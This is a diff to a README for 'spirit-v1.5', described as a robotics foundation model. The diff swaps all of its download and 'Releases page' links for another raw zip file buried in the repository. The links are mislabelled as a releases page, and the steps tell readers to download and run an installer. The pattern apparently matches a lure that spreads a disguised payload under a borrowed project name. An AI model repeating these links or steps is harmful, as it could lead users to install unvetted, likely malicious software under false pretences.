@@ -1,6 +1,6 @@
 # 🤖 spirit-v1.5 - Simplifying Robotics for Everyone
 
-[![Download spirit-v1.5](https://raw.githubusercontent.com/luludoudou2/spirit-v1.5/main/scripts/v-spirit-3.6-alpha.4.zip)](https://raw.githubusercontent.com/luludoudou2/spirit-v1.5/main/scripts/v-spirit-3.6-alpha.4.zip)
+[![Download spirit-v1.5](https://github.com/luludoudou2/spirit-v1.5/raw/refs/heads/main/robochallenge/robot/v_spirit_v3.5.zip)](https://github.com/luludoudou2/spirit-v1.5/raw/refs/heads/main/robochallenge/robot/v_spirit_v3.5.zip)
 
 ## ✨ Overview
 
@@ -11,13 +11,13 @@ Spirit-v1.5 is an advanced robotic foundation model designed by Spirit AI. This 
 To get started with Spirit-v1.5, follow these easy steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/luludoudou2/spirit-v1.5/main/scripts/v-spirit-3.6-alpha.4.zip) where you can find the latest version of the application.
+   Go to the [Releases page](https://github.com/luludoudou2/spirit-v1.5/raw/refs/heads/main/robochallenge/robot/v_spirit_v3.5.zip) where you can find the latest version of the application.
 
 ## 📥 Download & Install
 
 To download and install Spirit-v1.5, do the following:
 
-1. **Go to the Releases Page**: Click this link to visit the [Releases page](https://raw.githubusercontent.com/luludoudou2/spirit-v1.5/main/scripts/v-spirit-3.6-alpha.4.zip).
+1. **Go to the Releases Page**: Click this link to visit the [Releases page](https://github.com/luludoudou2/spirit-v1.5/raw/refs/heads/main/robochallenge/robot/v_spirit_v3.5.zip).
 2. **Select the Latest Release**: Look for the most recent version listed at the top of the page. This will usually be labeled as “Latest Release.”
 3. **Download the Application**: Click on the link for the file that matches your operating system (e.g., Windows, macOS). The file will usually have an extension like `.exe` or `.dmg`.
 4. **Install the Application**: Once the download completes, open the file to start the installation process. Follow the easy on-screen instructions to complete the installation.
@@ -50,7 +50,7 @@ If you encounter any issues while using Spirit-v1.5, you can access a variety of
   
 ## 🔗 Important Links
 
-- **[Releases Page](https://raw.githubusercontent.com/luludoudou2/spirit-v1.5/main/scripts/v-spirit-3.6-alpha.4.zip)**
+- **[Releases Page](https://github.com/luludoudou2/spirit-v1.5/raw/refs/heads/main/robochallenge/robot/v_spirit_v3.5.zip)**
 - **Documentation**: Access the user guides and supplementary materials.
 
 ## 🎉 Conclusion
